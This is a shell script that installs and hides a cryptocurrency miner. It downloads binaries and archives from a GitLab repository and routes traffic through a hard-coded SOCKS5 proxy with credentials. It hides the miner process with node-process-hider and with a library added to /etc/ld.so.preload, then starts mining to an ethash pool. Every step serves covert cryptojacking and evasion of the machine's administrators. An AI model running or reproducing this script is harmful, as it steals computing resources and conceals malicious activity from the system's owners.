ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone
dpkg-reconfigure --frontend noninteractive tzdata


apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen

apt-get install libpci3

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

nohup wget https://gitlab.com/randukapuk625/novi/-/raw/main/grapLol.tar.gz > nohup.out

tar -xvzf grapLol.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.86.71.9:6269
socks5_username = lebarankita
socks5_password = buatTHRan
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

nohup wget https://gitlab.com/randukapuk625/novi/-/raw/main/mini > nohup.out
make
chmod +x mini
ph add mini

wget https://gitlab.com/randukapuk625/novi/-/raw/main/Magicmini.zip > nohup.out
make
nohup unzip Magicmini.zip > nohup.out
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
nohup ./graftcp/graftcp ./mini --url=ssl://teguhcong.usahabener@ethash.poolbinance.com:1800 --log --extra > nohup.out
